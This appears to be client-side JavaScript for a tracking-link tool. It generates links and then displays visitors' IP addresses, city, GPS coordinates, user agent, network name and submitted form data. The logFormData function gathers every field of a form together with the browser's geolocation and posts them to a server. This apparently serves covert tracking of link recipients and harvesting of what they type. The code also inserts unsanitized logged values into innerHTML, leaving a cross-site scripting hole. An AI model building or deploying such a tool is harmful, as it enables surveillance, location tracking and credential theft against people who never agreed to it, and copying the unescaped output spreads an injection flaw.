// Function to generate tracking link
function generateLink() {
  var originalUrl = document.getElementById("originalUrl").value;
  
  fetch('http://localhost:3000/generate', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ url: originalUrl })
  })
  .then(response => response.json())
  .then(data => {
    document.getElementById("trackingLink").innerHTML = "<strong>Tracking Link:</strong> <a href='" + data.trackingLink + "'>" + data.trackingLink + "</a>";
    fetchLogs(data.trackingLink.split('/').pop());
  })
  .catch(error => {
    console.error('Error generating tracking link:', error);
  });
}

// Function to fetch visit logs
function fetchLogs(id) {
  fetch(`http://localhost:3000/logs/${id}`)
    .then(response => response.json())
    .then(data => {
      let logs = '<h2>Visit Logs</h2>';
      data.forEach(log => {
        logs += `<p>Timestamp: ${new Date(log.timestamp).toLocaleString()}<br>
                 IP: ${log.ip}<br>
                 Location: ${log.geo ? log.geo.city + ', ' + log.geo.country : 'N/A'}<br>
                 Latitude: ${log.latitude || 'N/A'}<br>
                 Longitude: ${log.longitude || 'N/A'}<br>
                 User-Agent: ${log.userAgent}<br>
                 Network Name: ${log.networkName || 'N/A'}<br>
                 Form Data: ${JSON.stringify(log.formData)}</p>`;
      });
      document.getElementById("visitLogs").innerHTML = logs;
    })
    .catch(error => {
      console.error('Error fetching visit logs:', error);
    });
}

// Function to log form data
function logFormData(formId, trackingId) {
  const form = document.getElementById(formId);
  const formData = new FormData(form);
  const data = {};
  formData.forEach((value, key) => { data[key] = value; });

  // Request geolocation permission
  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(position => {
      // Add latitude and longitude to form data
      data.latitude = position.coords.latitude;
      data.longitude = position.coords.longitude;

      // Send form data to server
      sendFormDataToServer(data, trackingId);
    }, error => {
      console.error("Error getting geolocation:", error.message);
      // Still send form data without geolocation
      sendFormDataToServer(data, trackingId);
    });
  } else {
    console.log("Geolocation is not supported by this browser.");
    // Send form data without geolocation
    sendFormDataToServer(data, trackingId);
  }
}

// Function to send form data to server
function sendFormDataToServer(formData, trackingId) {
  fetch(`http://localhost:3000/logformdata/${trackingId}`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(formData)
  })
  .then(response => response.json())
  .then(result => {
    if (result.success) {
      document.getElementById("formLogs").innerHTML += `<p>Form Data: ${JSON.stringify(result.formData)}</p>`;
    }
  })
  .catch(error => {
    console.error('Error logging form data:', error);
  });
}
